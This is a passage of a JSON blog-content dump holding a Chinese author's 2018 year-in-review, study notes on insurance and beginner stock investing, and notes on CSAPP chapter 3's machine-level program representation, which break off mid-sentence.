抓住小趋势，首先总得了解事实真相；抓住小趋势，你要能挣脱观念枷锁；抓住小趋势，你得重新定位生命的坐标；抓住小趋势，你得学会从人的身上汲取力量；抓住小趋势，你还得有一套长期主义的人生算法。 所有事到最后都会是好事。如果还不是，那它还没到最后。 –约翰·列侬 对未来最大的慷慨，是把一切献给现在. –阿尔贝·加缪 有意瞄准，无意击发。","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://leo.dropsec.xyz/tags/读书笔记/"}]},{"title":"Leooel 的 2018","slug":"Leooel-的-2018","date":"2018-12-31T06:16:38.000Z","updated":"2018-12-31T11:52:26.167Z","comments":true,"path":"2018/12/31/Leooel-的-2018/","link":"","permalink":"http://leo.dropsec.xyz/2018/12/31/Leooel-的-2018/","excerpt":"","text":"动笔之前阅读了 Jerry Wang 的年终总结，专注与坚持两个字眼再一次直击我的内心。客观看来我确实有一点专注，也有一点坚持，不过在真正的专注和坚持面前也的的确确如我所述：一点而已。 我的 2018 依然以时间轴的方式展开回顾。 二月、三月，寒假前期倒腾了一段时间电脑将用了四年的本子去掉光驱换成了固态，老树抽新芽？读完了吴军博士的《浪潮之巅》在科技帝国的兴衰史里遨游了一圈暗暗赞叹那些巨人领袖们的远见哦，还到阳泉姑姑家学习了些关于养发的知识~ 寒假开学到放暑假依然凭空记不起什么还好有博客记录嗯，大二下的课余用来学习二进制了参加了几场 CTF比赛之后一段时间在职业方向的选择问题上和九层台探讨了好多最后决定把安全作为自己的业余爱好（工作）清明假期和舍友去了一趟千年古刹——少林寺虽说商业化比较严重但是其历史底蕴给我的震撼感在返校后持续了好几天才慢慢消散并且重看了经典版的《少林寺》花了半天的时间研究少林寺的官网信息感叹释永信的互联网思维带领少林寺走向了世界 还有一个微小但必须记录的事情5月11号，以特殊的方式进入了知识星球从此开始接受并拥抱知识付费时代的来临并沉溺其中不可自拔 暑假先是因为「大学生社会实践活动」跟着老师去了一趟安阳其间收获最大的是从马学长身上学到的有想法、有干劲的精神回校后重新敲了一遍《数据结构》书上的部分代码读完了《码农翻身》但是由于自身水平的限制并没有深刻的理解透书中的精髓其间去了一趟开封见到了「从来不会想起，永远不会忘记」的年轻的老友 大约是在某个懒洋洋的清晨结识了本不会结识的「无念」在她的影响之下开始关注理财的知识然后的然后发生了很多事情~暑假唯一的遗憾就是没能坚持按照原计划去完成任务 暑假开学到现在坚持学习完了基本的理财知识十月份的时候去上海参加了 2018谷歌开发者大会见到了和我一样年轻同时对未来充满渴望的同龄人 在知识星球上花了一些时间认知提高了一些思维也在一点点发生改变总之依旧没能把很多时间用在学校课程的学习上虽深知欠下的早晚要还 2019专注 坚持少做些没有意义的事情多做些对自己成长有帮助的事情要以更高的标准来要求自己执行力要向 stormzhang 看齐我希望自己能成为像 Fenng 那样的人最后感谢那些陪伴我、支持我成长的人","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"保险实战课笔记","slug":"保险实战课笔记","date":"2018-12-19T05:55:31.000Z","updated":"2019-02-10T14:16:56.191Z","comments":true,"path":"2018/12/19/保险实战课笔记/","link":"","permalink":"http://leo.dropsec.xyz/2018/12/19/保险实战课笔记/","excerpt":"2018.09.01 1460￥","text":"2018.09.01 1460￥ 保险到底要不要买？ 对待风险的四种策略：避免它、减轻它、转移它、接受它 保险的本质：转移风险 买错保险，很有可能花了钱，起不到保障！ 这门课的学习目标： 明确需求：给谁买？买多少？ 认识保障：寿险、重疾险、意外险… 都是啥？ 学会选择：怎么选？选什么？ 避免掉坑： 香港保险、奇葩险，买不买？ 学完即用：一款具体产品怎么分析？ 我有社保，为什么还要买保险？ 五险一金：养老保险、医疗保险、工伤保险、生育保险、失业保险和公积金，仅能提供最基本的保障 期望值= 概率 * 该事件带来的损失 （某事件发生的概率极小，并不一定代表其期望值小） 医保的作用其实很有限：社保由两个部分组成，自付部分和自费部分；超过自付阶段才能报销；社保需要先垫付，再报销；营养费、护理费等非直接医疗费用，社保是不报销的； 商业保险的作用：病有所医、亲有所护、避免二度伤害 买保险需结合自身、家庭的实时财务状况、风险偏好、期限配对、年龄等因素综合考虑进行规划 生活中的三大风险：意外、疾病、死亡 你必须了解的保险基础知识 前情提要：保险弥补意外、疾病和死亡等风险带来的经济损失；社保虽然有不足，但却必要有；买保险不能完美主义 保险的分类 一个靠谱的保险规划长什么样？ 保险规划的目的：在有限的条件下让我们能够得到基本保障；科学的保险体系需要解决人生的三大忧虑：老有所养、病有所医、亲有所护 病有所医、亲有所护：保险是最好的解决工具 老有所养：通过社保、个人储蓄、理财投资、商业保险等方式，越早准备越好 保险产品的价格 = 风险成本 + 经营成本 + 用来储蓄或者投资的部分 保险规划 首先要明确现阶段自己的保障需求 保障全面（身故、疾病、意外）、保额充足（少的话也是杯水车薪）、保费适当(保费预算可为年可支配收入的5%-10%，优先选择消费型保险) 动态变化、不断完善 意外险，杠杆率最高的保险 意外险的基本定义：所谓意外险，全称是人身意外伤害保险，通俗来说，就是我们投保了意外险之后，如果在保险期间，因遭受意外伤害而导致死亡或残疾，就可以按照合同约定找保险公司获得相应的赔偿。 意外险有两个基本要点: 时间界定：合同有效期内发生的，保险责任期内认定 责任界定：外来的，突发的，非本意的，非疾病的 意外险的分类： 意外伤害死亡残疾保险：只保障意外伤害导致的死亡或残疾 意外伤害医疗保险：意外伤害导致的医院治疗费，住院+津贴 综合意外伤害保险：既对死亡或残疾赔付，也对医疗费用赔付 意外伤害收入保障保险：因意外带来的收入影响 杠杆率 = 保额 / 保费， 意外险是杠杆率最高的保险 意外险的挑选原则： 保费的高低和年龄无关，和职业有关 选择短期消费型意外险，优先选择承诺可以续保的产品 保额最少50万 普通意外险的补充： 意外险产品分析及推荐 意外险的产品很多，要根据当下自己的实际情况选择适合自己的 关于重疾险，你必须知道的事！ 重大疾病险：由保险公司经办的以特定重大疾病，如恶性肿瘤、心肌梗死、脑溢血为保险对象，当被保人患有上述疾病时，由保险公司对所花医疗费用给予补偿的商业保险行为。特点：定额给付型只要确诊，就次性支付现金。 重疾险保颜多少合适？三部分费用: 治疗费用，30-50万 康复和营养费用， 10-20万 收入损失补偿，覆盖5年工作收入 重疾保额 = 重疾治疗花费 + 5年生活费用 + 房贷余额 - 流动资产 如何挑选适合的重疾险产品？ 经济状况允许，优先考虑终身型重疾险 一年期重疾险和长期定期重疾险，优先选择长期的，保证续保！ 选择消费型重疾险，拒绝返回型重疾险 保障疾病范围不是越多就一定越好，越多保费越贵，一般常见25种疾病足够 重疾险产品分析 轻松看懂一款保险 看保障范围：保什么疾病？ 看等待期：等待期内不理赔 看保险利益：何种情况下获得什么保障？ 看缴费年限：交多少年？（推荐年交，如遇“轻症豁免”省保费） 看责任免除 如何给儿童买保险？ 特别注意：一定要如实填写健康信息，否则出现差错可能会不赔付保额 除了重疾险，你还该有医疗险 生的病不在保障范围内，就可以用到医疗险；健康医疗险以报销或者津贴的方式来弥补疾病造成的经济损失 一般生病开销可以靠社保 + 储蓄；一款重疾险 + 医疗险，可以保证绝大多数病症；最后，一定要如实告知健康状况！ 直面死亡，我们需要寿险 人寿保险，就是以被保险人的生命为保险对象的保险。被保险人在保险期内生存或者身故，由保险公司根据契约规定给付保险金。随着保险业的不断发展，寿险产品变得越来越复杂，保障死亡、生存、还有理财投资… 寿险的分类： 按保险责任分类：定期寿险、终身寿险、两全寿险 按保费/保额是否可调整分类：传统寿险、新型寿险（分红险、万能险、投资连接险） 选寿险需要明确三件事： 明确自己的需求，如果核心需求是保障，那就不考虑自带理财投资功能的保险 优先家庭的经济支柱。老人买寿险，容易出现“保费倒挂” 小孩买寿险，限制条件多多；如，10周岁及以下的未成年人，以死亡为赔付条件的保险金不得超过20万；10周岁-18周岁，不得超过50万 寿险保额 = 预估未来10年的必须支出 + 计算家庭负债（房贷余额、车贷…） + 计算家庭支柱需要承担的赡养责任 - 现有流动资产（现金、能快速变现的基金、股票） 先保障，后理财！功能越多，保费越高！不要过于关注保险的收益！ 小小总结 寿险产品分析 挑选寿险的原则： 先保障后理财，如果你的需求是保障，那就不建议考虑理财型寿险，也不建议考虑所谓带有保费增值功能的保险和两全型保险 定期寿险和终身寿险，各有优势，至于如何选择，还是根据个人的需求、经济情况来综合考虑 寿险保额的计算公式 = 未来10年的生活费 + 房贷余额 - 流动资产 不买也要看得懂的理财型保险 新型保险：具备理财功能，保障 + 投资 种类：分红险、万能险、投资连接险 理财型保险三种类型的差别： 保障：分红险，保额固定；万能险和投资连接险，可以更改保额；（消费险也无法更改保额） 赚钱：分红险，有固定收益，分红取决于保险公司经营状况；万能险，保证最低收益；投资连接险，不保证最低收益，亏损也是有可能的 账户：分红险，保障和分红账户混合；万能险，保障和分红账户分开，1个投资账户；投资连接险，保障和分红账户分开，多种投资账户 分红险要不要买？ 小小总结 保险规划案例分析 回顾保险的基本原则 第一，先保障后理财，先大人后小孩，优先经济支柱 第二，先搞定能够应对意外、疾病、死亡三大风险的保险产品，再考虑养老；多少资产匹配多少保费与保额，量力而行；保险组合有比没有强，有钱再提额 第三，在预算充足的情况下，优先选择终身型产品 保费参考：收入的5%-10%（4000-800￥） 保额参考：意外险50万、重疾险50万、医疗险100万、寿险50万 双十原则：用10%的收入来买保险；保额要是家庭收入的10倍 保额不够，超出预算怎么办？ 量力而行 优先考虑经济支柱 优先考虑保险组合，保额不足先配置一部分，组合才是最重要的 不能超过年收入20% 参考案例：张蛋蛋的保险组合 保险规划总结： 优先经济支柱，优先保险组合 先保证意外、重疾、医疗和寿险 量入为出，循序渐进 优先选择大公司、大品牌 香港保险值得买吗？ 那些“站”香港保险的四大派 伪正派：香港的法制更加健全，香港保险制度更加健全….. 性价比派：性价比高，理赔好…. 收益派：分红收益比大陆高出一大截…. 土豪派：海外资产配置…. ✓ 香港保险分红没那么高；香港重疾险有双重标准；香港保险更强调行业“自律”，没有监管兜底 如果你定要去香港买保险….. 购买地一定要在香港境内：香港保监处只承认在香港境内签署的保单 标配:一张香港银行卡，开通网银账户、支票账户、本票账户 一定要找可靠可信的代理人 务必提前了解法律风险，香港法律和内地的不同 电话销售的保险靠谱吗？保险推销员为了将保险推销出去，会刻意回避很多免责条款，甚至在言语中有意无意的扩大承保范围 买保险注意事项： 投保人：花钱买保险的人 被保险人：保险事故的指向对象 受益人：事故发生后能拿到钱的人；如果不写受益人保险金会作为遗产处理 保险人：保险公司 买保险会遇到的专业名称： 犹豫期：10天内(银行15天)无条件退保 等待期：又称观察期，发生保险事故也不赔付 宽限期：延交保费，通常60天 理赔期：人寿保险5年内，其他保险2年内","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://leo.dropsec.xyz/tags/读书笔记/"}]},{"title":"股票初级训练营笔记","slug":"股票初级训练营笔记","date":"2018-11-04T11:08:41.000Z","updated":"2019-02-10T14:17:29.460Z","comments":true,"path":"2018/11/04/股票初级训练营笔记/","link":"","permalink":"http://leo.dropsec.xyz/2018/11/04/股票初级训练营笔记/","excerpt":"股票卖出有三种情况，股票的价格高于它的价值了；原来的好公司基本面转坏了；发现了更好更便宜的股票。","text":"股票卖出有三种情况，股票的价格高于它的价值了；原来的好公司基本面转坏了；发现了更好更便宜的股票。 一、价值投资 &amp; 成长投资 股票投资的五大流派 技术投资派 宏观投资派 有效市场派 成长投资派 价值投资派（本杰明·格雷厄姆） 二、找准入场时机 买股票就是买公司，每一家公司都有其内在价值。价值决定了涨跌的趋势，价格围绕价值上下波动。 公司的价值 = 现在公司的价值 + 未来公司能赚取的价值 市盈率（PE）= 市值 / 净利润 = 买下公司需要的钱 / 每年能赚到的钱 = 回本年限 PE越小，回本时间越短，越有投资价值 市净率（PB）= 市值 / 净资产 = 买下公司需要的钱 / 属于公司自己的资产 PB越小，价格越低，越有投资价值 利用沪深300、中证500的PE、PB，判断入场时机。 当沪深300、中证500中任意一个的PE和PB同时满足以下两个条件，则认为沪深300或中证500处于低估状态，此时可以入场投资。 PE处于近十年数值的0-50%区间内; PB处于近十年数值的0-20%区间内; 以上条件可在“理杏仁”搜索该指数，点选PE\\B-TTM、加权平均值、10年，然后查看当前分位点判断是否满足条件（将数据从小到大排序，当前值所处的位置）； 三、构建投资组合 股票投资的风险 系统性风险：政策风险、购买力风险、利率风险 非系统性风险：经营风险、信用风险、道德风险 如何规避非系统性风险？ 不要追热点、听小道消息 构建投资组合 组合里有多少支股票合适？ 持有4-8支股票是比较经济、有效的选择 组合里有多少个行业合适？ 分散行业，同行业的资金占比不要超过30% 四、初寻白马股 投资回报率 = （卖出价格 / 买入价格 - 1）* 100% 年化复合收益率 = $ ((卖出价格 / 买入价格)^{1/n} - 1) * 100% $ n为投资年限 股海寻白马 白马股三个特点 投资回报率高、长期业绩优秀、信息相对可靠 净资产收益率（ROE）= 净利润 / 净资产 代表企业用一元钱的净资产能够赚取多少净利润，代表企业的赚钱能力 净资产收益率（ROE）越高，年化收益率越高 寻找白马股第一条筛选条件：净资产收益率（ROE）连续7年 ≥ 15% 筛选方法 五、剔除周期股 避免以下行业 六、剔除基本面转坏的股票 两个财务指标来判断公司业绩的增长或下滑 营业收入增长率（营收增长率） 净利润增长率 评估白马股业绩是否下滑，看以下四个指标，只要有一个指标是负数，就要从组合中剔除 最近的年度营收增长率 最近的年度净利润增长率 最近的季度营收增长率 最近的季度净利润增长率 七、识别收入美化 财报（从会计角度记录公司所有经营事务的报表） 利润表：又叫损益表，主要体现公司一段时间内是赚钱还是亏钱 资产负债表：记录了在特定的某一天，公司有多少钱、财、物以及欠别人多少钱 现金流量表：开支流水账,记录了公司花出去多少钱，收到多少钱 利润表 营业收入 - 营业成本 - 三费 = 营业利润 营业利润 - 所得税 = 净利润 三费，包括管理费用、销售费用、财务费用 收入的多少直接影响公司利润的多少 什么算公司的收入？ 当场买卖收到的钱 预收账款，不算收入；货给客户后才算收入 客户赊账，应收账款增加，算收入 总结：只要给了客户货，无论是否收到钱，都会记入营业收入 识别收入美化 小熊定理一(识别真货假卖)：连续2年应收账款上升幅度大于营业收入上升幅度，这家公司就需要警惕 应收账款：产品已给客户，但客户未付款，也就是白条 营业收入：公司卖产品的收入，白条也记入收入 操作：打开理杏仁网站，分别在利润表和资产负债表中设置起始时间、查看年度数据找到营业收入和应收账款数据，然后列表查看。 八、识别资产美化 小熊定理二(识别存货造假)：连续2年存货增长大于营业收入的增长，这家公司的存货可能有问题 小熊定理三(识别资产安全，是否有破产风险)：如果一家公司的流动负债远大于流动资产的话，说明这家公司已经非常接近破产了 流动资产：一年内可以变现的资产，如货币资金、存货、预付款项 流动负债：一年内必须要还的钱，如应付账款、短期借款 流动比率：流动资产 / 流动负债 如果公司的流动比 〈 1，说明流动资产小于流动负债，危险的信号 操作：打开理杏仁网站，搜索公司，资产负债表里查看流动比率 九、构建白马股 白马股特点 &amp; 筛选步骤 投资回报率高：ROE连续7年 ≥ 15% 上市时间 〉 5年 长期业绩优秀：根据公司所处行业，剔除周期股、剔除基木面转坏的股票（业绩下滑） 信息相对可靠：小熊三大定理检验经过筛选的股票 筛选出好股票后也要选好的价格进行买入 判断股票的价格 股票的贵与便宜是相对公司的价值而言的，而不是只看价格 操作：PE、PB估值。理杏仁中搜索该公司，价值分析栏目下有PE、PB数据，其分位点有一个超过50%就剔除 筛选好后怎么买？ 股票太多或钱不够怎么办？ 根据PE分位点从小到大排序，优先买PE分位点低的股票。并且同一行业的股票数量不要超过30% 资金应该怎么分配？ 平均分配到每支股票 该股票购买手数(凑整) = 总资金量 / 股票数量 / 一手的价格 什么时候卖？ 对于白马组合而言，好股票的基本面不会频繁变化，每年关注一次就好。只需要每年按照步骤重新筛选一遍，将最新筛出的组合结果和原来的组合结果对照 那些仍在的，持有就好；那些原来有，现在没有了的，卖出；而原来没有，现在有，买入；卖出的钱平均分配，买入组合中新出现的股票即可 十、Plan B：便宜股(双低指数) 选出的白马股都很贵的时候可以考虑 价格是杰出投资最主要的因素。优秀投资者的目标不只在于“买好的”，也在于“买的好”。 –霍华德·马克斯 便宜组合的3个筛选指标 0 &lt; PE &lt; 10 0 &lt; PB &lt; 1.5 股息率 &gt; 3% （可以看出公司是否大方的分钱） 股息率 = 公司过去一年的累计现金分红 / 公司市值 （A股公司平均股息率约为3%） 操作：打开理杏仁 → 选股 → 基本面选股 → 选择范围 → A股市场 → 沪深两市 → 条件设置 → 基本指标 → 点击筛选便宜组合的三个指标 → 时间选择最近时间 → 将3个指标范围填入表格 → 开始选股 → 导出 十一、构建便宜组合 打开导出的excel表 → PE、PB的排名按升序排列，股息率的排名按降序排列(利用RANK.EQ(数值,引用,排序方式)函数) → 将3个排名相加，计算综合排名 → 根据综合排名将公司按升序排列 便宜股选股 8-10支股票构建便宜组合 根据综合排名从低到高依次挑选，同行业公司不超过组合股票数量的30% PB分位点 &lt; 20% 资金分配 十二、你应该知道的 A股交易时间 周一至周五 9:30-11:30 13:00-15:00 每天的交易时间共4小时 法定休假日除外 K线根据计算周期可以分为日K、周k、月K、季K、年K 图底部的红绿柱子代表的是成交量，每根K线对应一根成交量的柱子。成交量代表的是一段时间内成交的股票数量，主要受供求关系的影响 股票买卖以“手”为单位，1手=100股，少于100股的1-99股称为零股 （卖出委托的时候可能出现零股，但是零股必须一次性卖出） A股交易费用 股票报价方式 现价委托（常用） 市价委托 A股独有特色：涨跌停板制度，即股票上涨幅度和下跌幅度只能是上一个交易日收盘价格的10% （ST开头的股票，涨跌幅限制为5%；新股首日上市，涨幅不能超过发行价的44%） A股交易制度：T+1制度，当天买入的债券不能当天卖出，需等待第二天方可卖出 十三、小小问候 股票投资讲求天时、地利、人和 天时：选择正确的时机入场，怎么判断? 打开理杏仁网站，找到“沪深300”和“中证500”这两只指数的PE、PB分位点 看沪深300的PE分位点小不小于50%，PB分位点小不小于20%，看中证500的PE分位点小不小于50%，PB分位点小不小于20% 只要沪深300、中证500中有一个全部在范围内，就可以入场买股票 地利：结合自己的资金情况，购买适合的“白马组合”或“便宜组合” 人和：要有强大的投资者心态，理性、韧性和耐心 贪多嚼不烂、笑看涨跌(不要每天看盘，一个月看一次就够了)、保持耐心，长期持有 时间，是炖制“财富自由”这道大餐的基础条件和火候。迫不及待试图去减少火候，从慢慢炖改为大火爆炒，快是快了，但最终吃到嘴的是什么味儿，就很不好说了。 –《股市进阶之道》 课后“金句”记录要在别人贪婪的时候恐惧，而在别人恐惧的时候贪婪。 –巴菲特如果你没有持有一种股票10年的准备，那么连10分钟都不要持有这种股票。 –巴菲特只有退潮时，你才知道谁是在裸泳。 –巴菲特投资企业而不是股票。 –巴菲特拥有一支股票，期待它明天早晨就上涨是十分愚蠢的。 –巴菲特投资的成功是建立在已有的知识和经验基础上的。 –纽伯格别人的鞋子不合自己的脚。 –纽伯格时机可能不能决定所有事情，但时机可以决定许多事情。 –纽伯格一个真正的投资者并不会如赌博般随意投放资金，他只会投放于有足够可能性获取利润的工具上。 –纽伯格股票显然是所有追求长期增长的投资者的首选资产。 –纽伯格热爱一只股票是对的，但当它股价偏高时，还是让别人去热爱吧。 –纽伯格谁要是说自己总能够抄底逃顶，那准是在撒谎。 –伯纳德·巴鲁克谁活得最久，才活得最逍遥，才赚得最自在。 –伯纳德·巴鲁克我们不是被市场打败的，是被自己打败的。 –伯纳德·巴鲁克","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://leo.dropsec.xyz/tags/读书笔记/"}]},{"title":"CSAPP-第三章：程序的机器级表示","slug":"CSAPP-第三章：程序的机器级表示","date":"2018-11-04T03:31:29.000Z","updated":"2019-02-10T13:45:59.396Z","comments":true,"path":"2018/11/04/CSAPP-第三章：程序的机器级表示/","link":"","permalink":"http://leo.dropsec.xyz/2018/11/04/CSAPP-第三章：程序的机器级表示/","excerpt":"对机器而言，程序只是一个字节序列，它对你写的源代码一无所知。","text":"对机器而言，程序只是一个字节序列，它对你写的源代码一无所知。 3.1 历史观点 每个后继处理器的设计都是向后兼容的——较早版本上编译的代码可以在较新的处理器上运行； 3.2 程序编码 编译选项 -Og 告诉编译器使用会生成符合原始C代码整体结构的机器代码的优化等级； 对于机器级编程来说，两种重要抽象分别是 由指令集架构（ISA=Instruction Set Architechture）来定义机器级程序的格式和行为。大多数 ISA 将程序的行为描述成好像每条指令都是按顺序执行的，一条指令结束后，下一条再开始。实际上处理器的硬件可以并发的执行许多指令，但是可以采取措施保证整体行为与 ISA 指定的顺序执行行为完全一致； 机器级程序使用的内存地址是虚拟地址，提供的内存模型看上去像一个非常大的字节数组。存储器的实际实现是将多个硬件存储器和操作系统软件组合起来的； 一些重要的处理器状态 程序计数器（PC）：在 x86-64 中用%rip表示，里面存放的值代表着将要执行的下一条指令在内存中的地址； 整数寄存器文件包含 16 个命名的位置，分别存储64位的值。这些寄存器可以存储地址或整数数据； 条件码寄存器保存着最近执行的算术或逻辑指令的状态信息，每个通常只有一个 bit； 一组向量寄存器可以存放一个或多个整数或者浮点数值； ATT 与 Intel 汇编代码格式 ATT 汇编代码格式是 GCC、OBJDUMP 和其他一些我们使用的工具的默认格式（本书中，采用ATT格式）； 其他一些编程工具，包括 Microsoft 的工具，以及来自 Intel 的文档，其汇编代码都是 Intel 格式的； Intel 和 ATT 格式的不同 Intel 代码省略了指示大小的后缓，指令 push 而不是 pushq； Intel 代码省略了寄存器名字前面的 ‘%’ 符号，用的是 rbx,而不是 %rbx； Intel 代码用不同的方式来描述内存中的位置，例如是 ‘QWORD PTR [rbx]’而不是‘(%rbx)’； 在带有多个操作数的指令情况下，列出操作数的顺序相反； 对于一些应用程序，程序员必须用汇编代码来访问机器的低级特性 一种方法是用汇编代码编写整个函数，在链接阶段把它们和C函数组合起来； 另一种方法是利用 GCC 的支持，直接在C程序中嵌入汇编代码； 在C程序中包含汇编代码会使得这些代码与某类特殊的机器相关，所以只应该在想要的特性只能以此种方式才能访问到的时候使用这种方式； 3.3 数据格式 大多数 GCC 生成的汇编代码指令都有一个字符的后缀，表明操作数的大小。比如 b,w,l,q； 3.4 访问信息 机器指令可以对这 16 个寄存器的低位字节中存放的不同大小的数据进行操作。对于生成小于 8 字节结果的指令有两条规则： 生成 1 字节和 2 字节数字的指令会保持剩下的字节不变; 生成 4 字节数字的指令会把高位的 4 个字节置为 0; 各种不同的操作数的可能性被分为三种类型： 立即数; 寄存器; 内存引用; 寻址模式 语法 $ Imm(r_b,r_i,s) $ 表示的是最常用的形式。这样的引用有四个组成部分:一个立即数偏移Imm,一个基址寄存器 $ r_b $ ，一个变址寄存器 $ r_i $ 和一个比例因子 s，这里 s 必须是 1、2、4 或者 8; 基址和变址寄存器都必须是 64 位寄存器。有效地址被计算为 $ Imm+R[r_b]+R[r_i]*s $ 引用数组元素时，会用到这种通用形式。其他形式都是这种通用形式的特殊情况，只是省略了某些部分； 数据传送指令 最频繁使用的指令是将数据从一个位置复制到另一个位置的指令; 源操作数指定的值是一个立即数，存储在寄存器或者内存中； 目的操作数指定一个位置，可以是寄存器或者内存地址； x86-64 加了一条限制，传送指令的两个操作数不能都指向内存位置； 数据传送示例 C语言中所谓的指针其实就是地址。间接引用就是将该指针放在一个寄存器中，然后在内存引用中使用这个寄存器； 局部变量通常是保存在寄存器中，而不是内存中。访问寄存器比访问内存要快得多； 压入和弹出栈数据 栈向下增长，所有栈顶元素的地址是所有栈中元素地址最低的； 因为栈和程序代码以及其他形式的程序数据都是放在同一内存中，所以程序可以用标准的内存寻址方法访问栈内的任意位置； 3.5 算术和逻辑操作 加载有效地址指令 leaq 实际上是 movq 指令的变形。它的指令形式是从内存读数据到寄存器，但实际上它根本就没有引用内存。它的第一个操作数看上去是一个内存引用，但该指令并不是从指定的位置读入数据，而是将有效地址写入到目的操作数。 左移指令有两个名字： SAL 和 SHL，两者效果一样，都是将右边填上 0； 右移指令不同，SAR 执行算术移位（填上符号位），SHR 执行逻辑移位（填上0）； 3.6 控制 除了整数寄存器，CPU 还维护着一组单个位的条件码寄存器，它们描述了最近的算术或逻辑操作的属性。可以检测这些寄存器来执行条件分支指令； 常用条件码 CF：进位标志。最近的操作使最高位产生了进位。可用来检查无符号操作的溢出； ZF：零标志。最近的操作得到的结果为 0； SF：符号标志。最近的操作得到的结果为负数； OF：溢出标志。最近的操作导致一个补码溢出——正溢出或负溢出； leaq 指令不改变任何条件码，因为它是用来进行地址计算的； CMP、TEST 指令只设置条件码而不改变任何其他寄存器； CMP 指令和 SUB 指令的行为是一样的，如果两个操作数相等，这些指令会将零标志设为 1； TEST 指令的行为和 AND 指令一样，除了它只设置条件码而不改变目的寄存器的值；其典型用法是，两个操作数是一样的，如：testq %rax, %rax 用来检查 %rax 是负数、零、还是正数； 条件码通常不会直接读取，常用的使用方法有三种： 可以根据条件码的某种组合，将一个字节设置为 0 或 1； 可以条件跳转到程序的某个其他部分； 可以有条件地传送数据； 大多数情况下，机器代码对于有符号和无符号两种情况都使用一样的指令，这是因为许多算术运算对无符号和补码算术都有一样的位级行为； 跳转指令有几种不同的编码，最常用的是“PC相对的”（PC-relative），它们会将目标指令的地址与紧跟在跳转指令后面那条指令的地址之间的差作为编码；第二种编码方法是给出“绝对”地址，用 4 个字节直接指定目标。汇编器和链接器会选择适当的跳转目的编码； rep/repz 指令是一种空操作，用 rep 后面跟 ret 的组合来避免使 ret 指令成为条件跳转指令的目标； 实现条件操作 控制的条件转移（传统）：根据代码的条件结果来选择执行的路径； 数据的条件传送（更符合现代处理器的性能特性）：指先把结果执行，在根据条件结果选择结果值； 为什么基于条件数据传送的代码会比基于条件控制转移的代码性能要好？ 我们必须了解一些关于现代处理器如何运行的知识。处理器通过使用流水线(pipelining)来获得高性能，在流水线中，一条指令的处理要经过一系列的阶段，每个阶段执行所需操作的一小部分(例如，从内存取指令、确定指令类型、从内存读数据、执行算术运算、向内存写数据，以及更新程序计数器)。这种方法通过重叠连续指令的步骤来获得高性能，例如，在取一条指令的同时，执行它前面一条指令的算术运算。要做到这一点，要求能够事先确定要执行的指令序列，这样才能保持流水线中充满了待执行的指令。当机器遇到条件跳转(也称为“分支”)时，只有当分支条件求值完成之后，才能决定分支往哪边走。处理器采用非常精密的分支预测逻辑来猜测每条跳转指令是否会执行。只要它的猜测还比较可靠(现代微处理器设计试图达到 90% 以上的成功率)，指令流水线中就会充满着指令。另一方面，错误预测一个跳转，要求处理器丢掉它为该跳转指令后所有指令已做的工作，然后再开始用从正确位置处起始的指令去填充流水线。正如我们会看到的，这样一个错误预测会招致很严重的惩罚，浪费大约 15~30 个时钟周期，导致程序性能严重下降。 另一方面，无论测试的数据是什么，编译出来使用条件传送的代码所需的时间都是约8个时钟周期。控制流不依赖于数据，这使得处理器更容易保持流水线是满的。 使用条件传送也不总会提高代码的效率。总的来说，条件数据传送提供了一种用条件控制转移来实现条件操作的替代策略。它们只能用于非常受限的情况，但是这些情况还是相当常见的，而且与现代处理器的运行方式更契合。 逆向工程循环：理解产生的汇编代码与原始代码之间的关系，关键是找到程序值和寄存器之间的映射关系。对逆向工程循环来说，看看在循环之前如何初始化寄存器，在循环中如何更新和测试寄存器，以及在循环之后又如何使用寄存器是一个通用的策略。 跳转表是一个数组，表项i是一个代码段的地址，这个代码段实现当开关索引值等于i时程序应该采取的动作。 程序代码用开关索引值来执行一个跳转表内的数组引用，确定跳转指令的目标。和使用一组很长的 if-else 语句相比，使用跳转表的优点是执行开关语句的时间和开关情况的数量无关。甚至当 switch 语句有上百种情况的时候，也可以只用一次跳转表访问去处理。 GCC 根据开关情况的数量和开关情况值的稀疏程度来翻译开关语句。当开关情况数量比较多，并且值的范围跨度比较小时，就会使用跳转表。 3.7 过程 过程是软件中一种很重要的抽象。它提供了一种封装代码的方式，用一组指定的参数和一个可选的返回值实现了某种功能。然后可以在程序中不同的地方调用这个函数； 运行时栈：C语言过程调用机制的一个关键特性（大多数其他语言也是如此）在于使用了栈数据结构提供的后进先出的内存管理原则。当 x86-64 过程需要的存储空间超出寄存器能够存放的大小的时候，就会在栈上面分配空间。这个部分成为过程的栈帧； 当前正在执行的过程的帧总是在栈顶。大多数过程的栈帧都是定长的，在过程的开始就分配好了。为了提高空间和时间效率，x86-64 过程只分配自己所需要的栈帧部分； 实际上，许多函数甚至不需要栈帧。当所有的局部变量都可以保存在寄存器中，而且该函数不会调用任何其它的函数时，就可以这样处理； 转移控制：可以看到，这种把返回地址压入栈的简单机制能够让函数在稍后返回到程序中正确的点； 数据传送：x86-64 中，大部分过程的数据传送是通过寄存器实现的； 如果一个函数有大于 6 个整型参数，超出 6 个的部分就要通过栈来传递。通过栈传递参数时，所有的数据大小都向8的倍数对齐； 栈上的局部存储：一般来说，过程通过减小栈指针在栈上分配空间。分配的结果作为栈帧的一部分，标号为局部变量；运行时栈提供了一种简单的、在需要时分配、函数完成时释放局部存储的机制； 寄存器中的局部存储空间：寄存器是唯一被所有过程共享的资源。虽然在给定时刻只有一个过程是活动的，我们仍然必须确保当一个过程（调用者）调用另一个过程（被调用者）时，被调用者不会覆盖调用者稍后会使用的寄存器的值。为此，x86-64 采用了一组统一的寄存器使用惯例，所有过程都必须遵循：寄存器 %rbx，%rbp 和 %r12 到 %r15 被划分为被调用者保存寄存器。过程 P 调用 Q 时，Q 必须保存这些寄存器的值，保证它们的值在 Q 返回到 P 时与 Q 被调用时是一样的。所有其它的寄存器，除了栈指针寄存器%rsp以外，都被分类成调用者保存寄存器。意味着任何被调用者都能修改它们，所以调用者要事先保存好它们的值，再去开始调用函数； 递归过程：前面已经描述的寄存器和栈的惯例使得 x86-64 过程能够递归的调用它们自身。每个过程调用在栈中都有它自己的私有空间，因此多个未完成调用的局部变量不会互相影响； 3.8 数组分配和访问 C语言中的数组是一种将标量数据聚集成更大数据类型的方式； 基本原则：指向数组开头的指针为x，则数组元素i会被存放在地址为 x + L * i 的地方，其中 L 